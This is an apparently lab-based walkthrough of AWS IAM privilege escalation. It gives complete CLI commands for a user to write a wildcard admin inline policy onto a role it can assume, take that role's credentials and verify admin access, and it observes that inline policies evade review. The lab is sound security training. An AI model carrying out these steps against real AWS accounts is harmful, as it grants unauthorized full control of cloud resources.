# Guided Walkthrough: One-Hop Privilege Escalation via iam:PutRolePolicy + sts:AssumeRole

This scenario demonstrates a privilege escalation vulnerability where a user has permission to modify inline policies on a role (`iam:PutRolePolicy`) AND can assume that same role (`sts:AssumeRole`). This combination creates a powerful privilege escalation path: the attacker adds an administrative inline policy to the target role and then assumes it to gain full admin access.

Unlike self-escalation scenarios where a role modifies itself, this is a **principal-access** attack where a USER modifies a ROLE and then assumes it. The target role may initially have minimal or no permissions, but the ability to modify its inline policies and then assume it is functionally equivalent to having direct admin access.

This scenario specifically uses **inline policies** via `PutRolePolicy`. While similar in outcome to the `iam-attachrolepolicy+sts-assumerole` scenario (which uses managed policies), inline policies are often overlooked in security reviews because they're embedded directly in the role rather than being standalone policy objects. This makes them a useful technique for staying under the radar.

## The Challenge

You start as `pl-prod-iam-017-to-admin-starting-user` — an IAM user with no administrative permissions. Your goal is to reach `pl-prod-iam-017-to-admin-target-role` and demonstrate administrator-level access.

Your starting principal holds two key permissions scoped to the target role:
- `iam:PutRolePolicy` on `arn:aws:iam::{account_id}:role/pl-prod-iam-017-to-admin-target-role`
- `sts:AssumeRole` on `arn:aws:iam::{account_id}:role/pl-prod-iam-017-to-admin-target-role`

The target role's trust policy already allows the starting user to assume it. The role currently has no meaningful permissions — but that's about to change.

## Reconnaissance

First, confirm your current identity and verify you have no admin access yet:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-iam-017-to-admin-starting-user

aws iam list-users --max-items 1
# An error occurred (AccessDenied) -- as expected
```

Now enumerate the target role to understand what you're working with:

```bash
# Check what inline policies the target role currently has
aws iam list-role-policies --role-name pl-prod-iam-017-to-admin-target-role
# PolicyNames: []  -- no inline policies yet

# Check the trust policy to confirm you can assume it
aws iam get-role --role-name pl-prod-iam-017-to-admin-target-role \
    --query 'Role.AssumeRolePolicyDocument'
```

The trust policy will show that the starting user is listed as a trusted principal. Combined with your `sts:AssumeRole` permission, you can assume this role -- but right now it has no useful permissions. That's the puzzle.

## Exploitation

Here's the key insight: you have `iam:PutRolePolicy`, which lets you write an inline policy directly onto the target role. There's no approval step, no confirmation dialog -- you can grant the role any permissions you want, including `AdministratorAccess`.

**Step 1: Write an inline admin policy onto the target role.**

```bash
aws iam put-role-policy \
    --role-name pl-prod-iam-017-to-admin-target-role \
    --policy-name admin-escalation \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }'
```

This call succeeds silently. The target role now has a wildcard allow inline policy attached to it.

**Step 2: Wait for IAM policy propagation.**

IAM changes are eventually consistent. In practice, 15 seconds is sufficient:

```bash
sleep 15
```

**Step 3: Assume the now-privileged role.**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

CREDENTIALS=$(aws sts assume-role \
    --role-arn arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-iam-017-to-admin-target-role \
    --role-session-name privesc-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
```

## Verification

With the assumed role credentials active, confirm you now have administrator access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::{account_id}:assumed-role/pl-prod-iam-017-to-admin-target-role/privesc-session

aws iam list-users --max-items 3 --output table
# Returns a table of IAM users -- admin access confirmed
```

## What Happened

You combined two permissions that individually seem limited but together form a complete privilege escalation path. `iam:PutRolePolicy` let you rewrite the permissions of a role you could already assume, effectively bootstrapping that role from zero permissions to full admin. `sts:AssumeRole` then let you step into those freshly elevated credentials.

In real-world environments, this pattern appears when developers are granted the ability to manage role policies for deployment automation, or when a "least privilege" policy is scoped to resource ARNs but the attacker controls one of those resources. The inline policy vector is particularly dangerous because it's less visible than managed policy attachments -- inline policies don't appear in IAM's policy library and are easy to miss in a policy audit.

To clean up the attack artifact (remove the inline policy), run `./cleanup_attack.sh` or use `plabs cleanup iam-017-iam-putrolepolicy+sts-assumerole`.
